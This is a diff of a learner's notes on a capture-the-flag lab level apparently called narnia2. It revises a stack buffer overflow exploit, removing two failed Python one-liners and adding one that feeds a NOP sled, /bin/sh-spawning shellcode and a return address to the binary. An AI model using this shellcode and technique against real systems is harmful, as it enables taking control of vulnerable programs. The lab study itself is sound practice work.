@@ -86,8 +86,4 @@ Breaking down my code, and switching to python to see if encoding is easier (and
 Total character size: 136 (75 + 25 + 44 in working code, so 144)
 Length of my shellcode: 28
 
-My python script would be `./narnia2 $(python -c 'print "\x90"*72 + "\xeb\x0e\x31\xdb\x5b\x31\xc9\x31\xd2\x31\xc0\x83\xc0\x0b\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\xc0\xd5\xff\xff"*11')`
-
-No luck. Try with the shellcode from the previous example? `./narnia2 $(python -c 'print "\x90" * 75 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\xc0\xd5\xff\xff" * 10')`
-
-Still no luck. Back to the original 'working' script and it fails now with segfault. So there is an element of randomness here.
+My python script would be `./narnia2 $(python -c 'print "\x90"*104 + "\xeb\x0e\x31\xdb\x5b\x31\xc9\x31\xd2\x31\xc0\x83\xc0\x0b\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\xc0\xd5\xff\xff"')`
